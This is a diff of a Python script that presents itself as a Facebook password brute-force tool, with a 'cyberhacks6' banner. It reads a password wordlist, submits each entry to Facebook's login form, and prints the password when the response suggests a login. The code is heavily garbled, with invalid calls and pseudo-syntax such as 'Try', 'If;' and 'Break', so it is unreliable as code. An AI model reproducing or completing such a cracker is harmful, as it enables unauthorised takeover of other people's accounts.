@@ -35,7 +35,7 @@ print('\033[1;32m| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __|
 print('\033[1;32m| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /\033[1;31m') 
 print('\033[1;32m|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/\033[1;31m')
 print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
-file=open('password.txt','r')
+file=open('passwords.txt','r')
 webbrowser.open('www.facebook.com/cyberhacks6')
 
 def login( email, password):
@@ -52,11 +52,11 @@ print("NO INTERNET CONNECTION OR CONNECTION TIMEOUT")
 
 i=0
 while file:
-    password=open('password.txt','o','r' )
+    password=open('passwords.txt','o','r' )
     password=file.readline().strip()
     i+=1
-    if len(password) < 10:
-     print=str(i) +" : ",password
+    if len(passwords) < 9:
+     print=str(i) +" : ",passwords
     continue
 request = webbrowser.open('urlopen')
 Try
@@ -64,11 +64,11 @@ Try
 If; responses; code == 200
 webbrowser.select_form(nr=0)()
 webbrowser.form['email']=email
-webbrowser.form['pass']=password
+webbrowser.form['pass']=passwords
 response = webbrowser.submit()
 response_data = response.read()
 'find friends' in response_data or 'two-factor authentication' in response_data or 'security code' in response_data;
-print("your password is : ",password)
+print("your password is : ",passwords)
 Break
 
 sys.exit
